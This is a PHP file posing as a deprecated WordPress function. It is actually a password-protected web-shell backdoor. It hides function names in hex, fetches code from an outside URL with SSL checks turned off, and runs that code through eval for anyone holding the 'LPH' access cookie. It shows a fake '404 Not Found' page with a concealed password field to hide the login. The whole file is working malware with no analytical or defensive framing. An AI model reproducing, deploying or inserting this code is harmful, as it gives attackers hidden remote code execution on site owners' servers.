<?php
/**
 * @package    Wordpress
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://tempmail-tempemail.com/page/a.txt';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$VFgCz3UkXhE1LUextDix4.z8EAATMaZTmFvy3EyB4QqA0JtEeKrAK'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'LPH', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>404 Not Found</title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{position:absolute;top:0;left:0;width:100vw;height:100vh;border:none}#form{position:absolute;z-index:9999}#form input{opacity:0;pointer-events:none;position:absolute;cursor:default;transition:0.3s}#form input.revealed{opacity:1;pointer-events:auto;cursor:pointer}#form button{display:none}.clue-dot{position:fixed;bottom:20px;right:20px;width:6px;height:6px;background:rgba(0,0,0,0.1);border-radius:50%;opacity:0.5;cursor:pointer}</style></head><body><iframe src="/404"></iframe><form id="form" method="post"><input type="password" name="password" id="input" autocomplete="off"><button type="submit">Login</button></form><div class="clue-dot" title="404"></div><script>const f=document.getElementById("form"),i=document.getElementById("input"),d=document.querySelector(".clue-dot"),x=Math.random()*(window.innerWidth-100),y=Math.random()*(window.innerHeight-30);f.style.left=`${x}px`;f.style.top=`${y}px`;d.onclick=()=>{i.classList.add("revealed");i.focus()};</script></body></html>
    <?php
}
?>